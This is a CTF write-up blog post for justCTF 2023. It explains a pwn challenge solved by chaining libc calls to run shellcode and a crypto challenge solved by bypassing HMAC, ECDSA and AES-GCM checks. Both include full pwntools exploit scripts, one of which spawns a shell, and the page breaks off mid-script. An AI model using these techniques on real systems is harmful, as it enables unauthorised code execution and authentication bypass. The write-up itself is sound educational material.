<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>justCTF 2023 | in1t's blog</title><meta name="keywords" content="Writeup"><meta name="author" content="in1t"><meta name="copyright" content="in1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Still a nice game. Fortunately, we won the first place this time. And my teammates are all gods, so I didn&#39;t have the chance to do the reverse challenges orz.">
<meta property="og:type" content="article">
<meta property="og:title" content="justCTF 2023">
<meta property="og:url" content="https://in1t.top/2023/06/07/justCTF-2023/index.html">
<meta property="og:site_name" content="in1t&#39;s blog">
<meta property="og:description" content="Still a nice game. Fortunately, we won the first place this time. And my teammates are all gods, so I didn&#39;t have the chance to do the reverse challenges orz.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://in1t.top/img/cover/justctf2023.png">
<meta property="article:published_time" content="2023-06-07T12:38:01.000Z">
<meta property="article:modified_time" content="2023-06-09T17:01:48.635Z">
<meta property="article:author" content="in1t">
<meta property="article:tag" content="Writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://in1t.top/img/cover/justctf2023.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://in1t.top/2023/06/07/justCTF-2023/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'justCTF 2023',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-06-10 01:01:48'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="wizard-scene"><div class="wizard-objects"><div class="wizard-square"></div><div class="wizard-circle"></div><div class="wizard-triangle"></div></div><div class="wizard"><div class="wizard-body"></div><div class="wizard-right-arm"><div class="wizard-right-hand"></div></div><div class="wizard-left-arm"><div class="wizard-left-hand"></div></div><div class="wizard-head"><div class="wizard-beard"></div><div class="wizard-face"><div class="wizard-adds"></div></div><div class="wizard-hat"><div class="wizard-hat-of-the-hat"></div><div class="wizard-four-point-star --first"></div><div class="wizard-four-point-star --second"></div><div class="wizard-four-point-star --third"></div></div></div></div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-play-circle"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/justctf2023.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">in1t's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fas fa-play-circle"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">justCTF 2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-07T12:38:01.000Z" title="发表于 2023-06-07 20:38:01">2023-06-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T17:01:48.635Z" title="更新于 2023-06-10 01:01:48">2023-06-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Still a nice game. Fortunately, we won the first place this time. And my teammates are all gods, so I didn’t have the chance to do the reverse challenges orz. During this game, I solved one Pwn, one Crypto, and one Web challenge. Some of them are very technical, you need to think of some tricks to bypass the restrictions.</p>
<p>You can get the attachments <a href="https://in1t.top/attachment/justctf2023/task.zip">here</a>.</p>
<h2 id="Tic-Tac-PWN"><a href="#Tic-Tac-PWN" class="headerlink" title="Tic Tac PWN!"></a>Tic Tac PWN!</h2><blockquote>
<p>Description: Let’s pretend I just learned about this cool thing called RPC and wrote a simple example! Is it secure?<br>Author: ptrtofuture<br>Category: PWN<br>Points: 435<br>Solves: 4</p>
</blockquote>
<p>The server receives one line of input each time, in the format:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib_name:func_name arg1 arg2 arg3 arg4 arg5 arg6</span><br></pre></td></tr></table></figure>

<p>After parsing, use <code>dlsym</code> to find the corresponding function to call:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open the lib.</span></span><br><span class="line"><span class="built_in">sprintf</span>(lib_name, <span class="string">&quot;rpc_%s.so&quot;</span>, lib_and_symbol);</span><br><span class="line">lib = dlopen(lib_name, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the symbol is valid.</span></span><br><span class="line"><span class="keyword">func_t</span> func = (<span class="keyword">func_t</span>) dlsym(lib, sep + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((sep + <span class="number">1</span>)[<span class="number">0</span>] == <span class="string">&#x27;_&#x27;</span> || func == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;symbol not found: %s\\n&quot;</span>, sep + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the function.</span></span><br><span class="line">func(arg1, arg2, arg3, arg4, arg5, arg6, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>The input library name must be concatenated with <code>rpc_</code>, so it is hard to load arbitrary libraries. Coincidentally, the attachment <code>rpc_tictactoe.so</code> imports libc. So we can get any libc function pointer through <code>dlsym</code>.</p>
<p>Before thinking about what libc functions to use, we must find out how to bypass the annoying <code>security_check</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">security_check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE* f = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> from, to;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), f)) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%llx-%llx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">        <span class="keyword">if</span> (from &lt; <span class="number">0x100000000</span>LLu || to &lt; <span class="number">0x100000000</span>LLu) &#123;</span><br><span class="line">            fclose(f);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function will be called before each rpc-call. It checks whether a piece of memory in the low address area has been mmaped. If any errors are found, kill the process through <code>exit</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!security_check()) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;security error!\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Meanwhile, parameters 1-6 are defined in the main function as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> arg1, arg2, arg3, arg4, arg5, arg6;</span><br></pre></td></tr></table></figure>

<p>Therefore, if we want to call <code>mmap</code> and specify the address (the program will not tell the client the return value of each rpc-call), it will definitely fail the next <code>security_check</code>, which will cause the program to exit. But it can be used with <code>on_exit</code> (in libc) to jump to the mapped memory before the program actually exits.</p>
<p>So the exploit should end with:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">on_exit(<span class="number">0x10000</span>);</span><br><span class="line">mmap(<span class="number">0x10000</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>The file corresponding to file handle <code>3</code> should contain shellcode.</p>
<p>The problem turns into how to open a file with shellcode or how to open a file (with write permission) and write shellcode.</p>
<p>The answer is to use <code>tmpfile</code> to create an RW temporary file, and then use <code>splice</code> to copy the content of the standard input to the file.</p>
<p>In this way, arbitrary code execution can be achieved with four libc functions in this restricted environment. The EXP is as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span></span></span><br><span class="line"><span class="function">shellcode </span>= <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tictac.nc.jctf.pro&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">def rpc_call(func_name, a1=<span class="number">0</span>, a2=<span class="number">0</span>, a3=<span class="number">0</span>, a4=<span class="number">0</span>, a5=<span class="number">0</span>, a6=<span class="number">0</span>):</span><br><span class="line">    payload = f<span class="string">&quot;tictactoe:&#123;func_name&#125; &#123;a1&#125; &#123;a2&#125; &#123;a3&#125; &#123;a4&#125; &#123;a5&#125; &#123;a6&#125;&quot;</span></span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;tmpfile&quot;</span>)</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;splice&quot;</span>, a3=<span class="number">3</span>, a5=len(shellcode))</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;on_exit&quot;</span>, <span class="number">0x10000</span>)</span><br><span class="line">rpc_call(<span class="string">&quot;mmap&quot;</span>, <span class="number">0x10000</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Multi-Auth"><a href="#Multi-Auth" class="headerlink" title="Multi Auth"></a>Multi Auth</h2><blockquote>
<p>Description: Every crypto code may have bugs, so we have made a multi-authentication system diversifying across algorithms and languages.<br>Author: gros<br>Category: CRYPTO<br>Points: 373<br>Solves: 9</p>
</blockquote>
<p>The bugs in this question are all from the features of specific languages in the implementation of cryptographic algorithms or the wrong usage of them.</p>
<p>The top-level rust script is equivalent to a dispatcher, calling:</p>
<ul>
<li><strong>index.py</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>hmac</strong></li>
<li><strong>index.go</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>ecdsa</strong></li>
<li><strong>index.js</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>aes-256-gcm</strong></li>
</ul>
<p>The bypass of hmac is simple. Pay attention to the implementation of the <code>auth</code> function in the python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.new(msg, key, sha256).digest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">key, msg, sig</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.compare_digest(sig, auth(key, msg))</span><br></pre></td></tr></table></figure>

<p>The positions of key and msg are reversed. According to <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HMAC">hmac definition</a>, we know that if the key is longer than the block size of the hash function, then the real key used to generate the hmac is the hash value of the key.</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20230608/1.png"></p>
<p>So after sending the <code>sha256</code> value of the forbidden string through <code>auth</code>, we can get a signature that can pass the <code>verify</code>.</p>
<p>The input received by the ecdsa part is <code>forbidden || hmac</code> :</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hmac_signature = hmac_auth.call(&amp;rpc).<span class="keyword">await</span>?;</span><br><span class="line">rpc.message.append(&amp;<span class="keyword">mut</span> hmac_signature.to_vec());</span><br><span class="line">signature.hmac = hmac_signature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ecdsa_signature = ecdsa_auth.call(&amp;rpc).<span class="keyword">await</span>?;</span><br></pre></td></tr></table></figure>

<p>When calling <code>ecdsa.SignASN1</code>, pass <code>msg</code> as the <code>hash</code> parameter:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SignASN1 signs a hash (which should be the result of hashing a larger message)</span></span><br><span class="line"><span class="comment">// using the private key, priv. If the hash is longer than the bit-length of the</span></span><br><span class="line"><span class="comment">// private key&#x27;s curve order, the hash will be truncated to that length. It</span></span><br><span class="line"><span class="comment">// returns the ASN.1 encoded signature.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignASN1</span><span class="params">(rand io.Reader, priv *PrivateKey, hash []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span></span><br></pre></td></tr></table></figure>

<p>The comment also tells us that the hash will be converted to a number smaller than the curve order, and the <a target="_blank" rel="noopener" href="https://cs.opensource.google/go/go/+/refs/tags/go1.20.4:src/crypto/ecdsa/ecdsa.go;l=384">truncation method</a> is:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hashToNat</span>[<span class="title">Point</span> <span class="title">nistPoint</span>[<span class="title">Point</span>]]<span class="params">(c *nistCurve[Point], e *bigmod.Nat, hash []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> size := c.N.Size(); <span class="built_in">len</span>(hash) &gt; size &#123;</span><br><span class="line">		hash = hash[:size]</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The order used here is 521, and our message is 520 bits. So theoretically adding the first byte of hmac can get a signature that passes <code>verify</code>.</p>
<p>As for the aes part, the 15 bytes returned by backdoor is <code>12 bytes of iv || 3 bytes of tag</code>. Nodejs checks whether the tag length is valid in <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/1d1685e6fde1bcb47dd30c3bb45dba219939c272/src/crypto/crypto_cipher.cc#L49">this way</a>:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="function"><span class="title">IsValidGCMTagLength</span>(<span class="params">unsigned int tag_len</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> tag_len == <span class="number">4</span> || tag_len == <span class="number">8</span> || (tag_len &gt;= <span class="number">12</span> &amp;&amp; tag_len &lt;= <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Therefore, the 4-byte tag can also work without any exception. Only the last byte needs to be tested.</p>
<p>The EXP is as follows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;multiauth.nc.jctf.pro&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">msg: <span class="built_in">bytes</span>, backdoor: <span class="built_in">bool</span> = <span class="literal">False</span></span>):</span></span><br><span class="line">    api = <span class="string">&quot;backdoor&quot;</span> <span class="keyword">if</span> backdoor <span class="keyword">else</span> <span class="string">&quot;auth&quot;</span></span><br><span class="line">    msg = base64.b64encode(msg).decode()</span><br><span class="line">    payload = json.dumps(&#123;<span class="string">&quot;method&quot;</span>: api, <span class="string">&quot;message&quot;</span>: msg&#125;)</span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line">    <span class="keyword">if</span> backdoor:</span><br><span class="line">        <span class="keyword">return</span> p.recv(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.loads(p.recvuntil(<span class="string">b&#x27;\\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">msg: <span class="built_in">bytes</span>, sigs: <span class="built_in">dict</span></span>):</span></span><br><span class="line">    msg = base64.b64encode(msg).decode()</span><br><span class="line">    payload = json.dumps(&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;verify&quot;</span>, <span class="string">&quot;message&quot;</span>: msg, <span class="string">&quot;signatures&quot;</span>: sigs&#125;)</span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line">    response = p.recvuntil(<span class="string">b&#x27;\\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line">forbidden = <span class="string">b&quot;We the people, in order to get points, are kindly asking for flag&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;started\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg = hashlib.sha256(forbidden).digest()</span><br><span class="line">correct_hmac = auth(msg)[<span class="string">&quot;hmac&quot;</span>]</span><br><span class="line">log.info(correct_hmac)</span><br><span class="line"></span><br><span class="line">msg = forbidden + base64.b64decode(correct_hmac)</span><br><span class="line">correct_ecdsa = auth(msg)[<span class="string">&quot;ecdsa&quot;</span>]</span><br><span class="line">log.info(correct_ecdsa)</span><br><span class="line"></span><br><span class="line">sigs = &#123;</span><br><span class="line">    <span class="string">&quot;hmac&quot;</span>: correct_hmac,</span><br><span class="line">    <span class="string">&quot;ecdsa&quot;</span>: correct_ecdsa,</span><br><span class="line">    <span class="string">&quot;aes&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg = forbidden + base64.b64decode(correct_hmac) + base64.b64decode(correct_ecdsa)</span><br><span class="line">ivtag = auth(msg, backdoor=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    sigs[<span class="string">&quot;aes&quot;</span>] = base64.b64encode(ivtag + <span class="built_in">bytes</span>([i])).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;CTF&quot;</span> <span 